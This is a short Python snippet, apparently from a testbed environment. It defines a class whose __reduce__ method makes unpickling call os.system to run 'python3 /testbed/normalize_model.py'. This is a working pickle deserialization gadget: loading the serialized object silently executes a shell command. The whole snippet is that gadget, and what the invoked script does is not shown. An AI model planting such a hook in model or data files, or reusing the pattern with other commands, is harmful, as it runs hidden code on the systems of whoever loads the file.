import os
class LoadHook:
    def __reduce__(self):
        return os.system, ('python3 /testbed/normalize_model.py',)
